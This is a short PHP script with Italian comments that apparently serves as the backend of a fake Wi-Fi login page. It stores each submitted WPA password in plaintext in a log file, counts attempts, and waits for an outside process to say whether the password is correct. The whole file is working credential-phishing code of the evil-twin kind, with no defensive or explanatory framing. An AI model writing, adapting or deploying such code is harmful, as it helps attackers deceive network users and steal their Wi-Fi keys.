<?php
    require_once('config/connector.php');
 
 	if( (isset($_POST['wpa_psw']) && !empty($_POST['wpa_psw'])) && (isset($_POST['wpa_psw_conf']) && !empty($_POST['wpa_psw_conf'])))
	{
		// Aggiornamento tentativi effettuati
		$hits = file(HIT);
		$hits[0]++;
		file_put_contents(HIT, $hits[0]);		
		
		// Password inviata
		file_put_contents(DATA, $_POST['wpa_psw']."\r\n", FILE_APPEND);
		
		// Aggiornamento intento
		$archivio = fopen(INTENTO, "w");
		fwrite($archivio, "\n");
		fclose($archivio);
		
		while (1)
		{
			if (file_get_contents(INTENTO) == 2) {
				// Password ok
				echo 'true';
				break;
			}
			else if (file_get_contents(INTENTO) == 1) {
				// Password errata
				echo 'false';
				break;
			}
			
			sleep(1);
		}
	}
?>
